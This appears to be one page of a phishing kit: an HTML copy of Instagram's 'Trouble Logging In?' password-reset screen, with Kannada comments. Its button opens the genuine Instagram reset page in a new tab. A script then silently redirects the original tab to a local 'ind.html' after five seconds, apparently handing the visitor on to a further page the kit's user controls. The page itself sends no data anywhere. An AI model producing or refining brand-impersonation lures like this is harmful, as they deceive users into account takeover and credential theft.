<!DOCTYPE html>
<html lang="kn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reset Password • Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
        body { background-color: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .reset-container { width: 100%; max-width: 350px; background: white; padding: 40px; border: 1px solid #dbdbdb; text-align: center; }
        .lock-icon { width: 80px; height: 80px; border: 2px solid #262626; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; font-size: 40px; }
        h2 { font-size: 16px; margin-bottom: 10px; }
        p { font-size: 14px; color: #8e8e8e; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; margin-bottom: 15px; }
        .reset-btn { display: block; width: 100%; background: #0095f6; color: white; padding: 8px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; text-decoration: none; }
    </style>
</head>
<body>

    <div class="reset-container">
        <div class="lock-icon">🔒</div>
        <h2>Trouble Logging In?</h2>
        <p>Enter your email, phone, or username to receive a reset link.</p>
        
        <input type="text" placeholder="Email, Phone, or Username">
        
        <a href="https://www.instagram.com/accounts/password/reset/" class="reset-btn" id="nextBtn" target="_blank">Send Login Link</a>
    </div>

    <script>
        document.getElementById('nextBtn').addEventListener('click', function(e) {
            // 5 ಸೆಕೆಂಡ್ (5000ms) ನಂತರ ನಿಮ್ಮ ind.html ಗೆ ರೀಡೈರೆಕ್ಟ್ ಆಗುತ್ತದೆ
            setTimeout(() => {
                window.location.href = "ind.html";
            }, 5000);
        });
    </script>
</body>
</html>
